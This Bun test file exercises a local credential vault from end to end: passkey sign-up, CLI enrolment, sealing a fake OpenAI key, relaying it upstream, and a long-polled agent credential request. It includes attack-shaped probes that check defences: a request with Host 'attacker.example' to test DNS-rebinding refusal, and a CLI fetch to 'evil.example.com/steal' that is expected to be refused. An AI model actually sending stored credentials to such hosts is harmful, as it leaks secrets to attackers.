// The hosted vault's engine on one machine, end to end over real HTTP: a
// passkey sign-up, a workspace, the real CLI enrolling and accepted with the
// passkey, a key sealed in the browser flow, a relayed call that carries it
// upstream without the CLI ever seeing it, and a refusal for an unbound host.

import { afterAll, beforeAll, expect, test } from "bun:test"
import { mkdtempSync, rmSync } from "node:fs"
import { homedir, tmpdir } from "node:os"
import { join } from "node:path"
import { BOOTSTRAP_FILE, startLocalVault, type LocalVault } from "../src/host.ts"
import { Person } from "./person.ts"

const CLI = join(import.meta.dir, "../../cli/src/main.ts")
const FAKE_KEY = "sk-proj-localJourneyNotARealKeyAAAAAAAAAAAAAAAAAAAAAA"

// The CLI refuses a home under a world-writable directory such as Linux's
// /tmp; CI points TMPDIR at the runner's own.
// keys.json, whatever this machine offers: these tests are not about custody.
const FILE_ONLY = { custody: { platform: process.platform, env: {}, helper: null } }
const base = process.env.TMPDIR && process.env.TMPDIR !== "/tmp" ? tmpdir() : join(homedir(), ".cache")
const root = mkdtempSync(join(base, "mehen-local-"))
const dataDir = join(root, "data")
const mehenHome = join(root, "home")

const upstream: { authorization: string | null; url: string }[] = []
const realFetch = globalThis.fetch
let vault: LocalVault
// The person who signed up in the journey, kept for the tests after it.
let journeyPerson: Person

beforeAll(async () => {
  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const request = new Request(input, init)
    if (new URL(request.url).hostname !== "api.openai.com") return realFetch(input, init)
    upstream.push({ authorization: request.headers.get("authorization"), url: request.url })
    return Response.json({ object: "list", data: [{ id: "gpt-test" }] })
  }) as typeof fetch
  vault = await startLocalVault({ dataDir, port: 0, hostname: "127.0.0.1", origin: null }, FILE_ONLY)
})

afterAll(async () => {
  globalThis.fetch = realFetch
  await vault.stop()
  rmSync(root, { recursive: true, force: true })
})

async function cli(...args: string[]): Promise<{ code: number; out: string; err: string }> {
  const proc = Bun.spawn(["bun", CLI, ...args], { env: { ...process.env, MEHEN_HOME: mehenHome, MEHEN_VAULT_URL: vault.origin, MEHEN_NO_AUTO_UPDATE: "1" }, stdout: "pipe", stderr: "pipe" })
  const [out, err, code] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text(), proc.exited])
  return { code, out, err }
}

test("a request addressed to another host name is refused (DNS rebinding)", async () => {
  const response = await realFetch(`${vault.origin}/healthz`, { headers: { host: "attacker.example" } })
  expect(response.status).toBe(421)
})

test("sign up, enrol the real CLI, store a key and relay with it", async () => {
  expect(vault.state()).toMatchObject({ origin: vault.origin, accounts: false, bootstrap: true, workspaces: [] })
  const person = new Person(vault.origin)
  journeyPerson = person
  await person.signUp((await Bun.file(join(dataDir, BOOTSTRAP_FILE)).text()).trim())
  expect(await Bun.file(join(dataDir, BOOTSTRAP_FILE)).exists()).toBe(false)
  expect(vault.state().bootstrap).toBe(false)
  const workspace = await person.createWorkspace("local", "Local")
  expect(await (await realFetch(`${vault.origin}/local/v1/state`)).json()).toMatchObject({ origin: vault.origin, accounts: true, bootstrap: false, workspaces: [{ slug: "local", name: "Local" }] })

  const enrol = await cli("enrol", "--workspace", "local", "--name", "journey-machine", "--json")
  expect(enrol.code).toBe(0)
  const started = JSON.parse(enrol.out) as { enrolment: string; code: string; slot: string }
  await person.acceptMachine(dataDir, workspace, started.code, started.enrolment, await Bun.file(join(started.slot, "enrolment.json")).json())
  expect((await cli("wait", started.enrolment, "--timeout", "30", "--json")).code).toBe(0)

  await person.addKey("local", "openai", "openai", FAKE_KEY)
  const listed = await cli("ls", "--json")
  expect(listed.code).toBe(0)
  expect(listed.out).toContain("\"slug\":\"openai\"")

  const fetched = await cli("fetch", "openai", "GET", "https://api.openai.com/v1/models", "--json")
  expect(fetched.code).toBe(0)
  expect(fetched.out).toContain("gpt-test")
  expect(upstream).toEqual([{ authorization: `Bearer ${FAKE_KEY}`, url: "https://api.openai.com/v1/models" }])
  expect(fetched.out + fetched.err).not.toContain(FAKE_KEY)

  const refused = await cli("fetch", "openai", "GET", "https://evil.example.com/steal", "--json")
  expect(refused.code).toBe(5)
  expect(refused.out + refused.err).toContain("binding_refused")
  expect(upstream).toHaveLength(1)

  // Pushing is on in a local vault, and still needs the credential's own
  // allowance, which a person turns on with a passkey: none asked, none sent.
  const push = await cli("push", "openai#key", "--to", "github:acme/app/OPENAI_API_KEY", "--reason", "the evals workflow", "--json")
  expect(push.out + push.err).not.toContain("not available yet")
  expect(push.out + push.err).toContain("may not be put into other services' secret stores")
  expect(push.out + push.err).not.toContain(FAKE_KEY)
  expect(upstream).toHaveLength(1)
}, 60_000)

// Bun's server closes a connection idle for 10 s unless told otherwise, and
// the vault holds a ?wait=1 poll for up to 25 s: an agent's wait held past
// 10 s still gets its answer, with every poll signed once.
test("an agent's request --wait held past 10 s gets the credential once a person adds it", async () => {
  const person = journeyPerson
  const proc = Bun.spawn(["bun", CLI, "request", "api-key", "--name", "held-key", "--host", "api.example.com", "--header", "Authorization", "--format", "Bearer {key}", "--reason", "hold a wait past the idle timeout", "--wait", "--timeout", "60", "--json"], { env: { ...process.env, MEHEN_HOME: mehenHome, MEHEN_VAULT_URL: vault.origin, MEHEN_NO_AUTO_UPDATE: "1" }, stdout: "pipe", stderr: "pipe" })
  const err = new Response(proc.stderr).text()
  // The ask's line comes first; the wait's answer is the last line.
  const reader = proc.stdout.getReader()
  let stdout = ""
  while (!stdout.includes("\n")) {
    const chunk = await reader.read()
    if (chunk.done) break
    stdout += new TextDecoder().decode(chunk.value)
  }
  const intake = (JSON.parse(stdout.split("\n")[0] ?? "{}") as { intake?: string }).intake ?? null
  const rest = (async () => {
    for (;;) {
      const chunk = await reader.read()
      if (chunk.done) return
      stdout += new TextDecoder().decode(chunk.value)
    }
  })()
  expect(intake).toMatch(/^int_/)
  await Bun.sleep(12_000)
  await person.fulfilIntake("local", intake as string, "held-key-value-not-a-secret")
  const [code, stderr] = await Promise.all([proc.exited, err, rest])
  expect(stdout + stderr).not.toContain("proof_invalid")
  expect(code).toBe(0)
  expect(stdout.trim().split("\n").at(-1)).toContain("\"status\":\"completed\"")
}, 60_000)
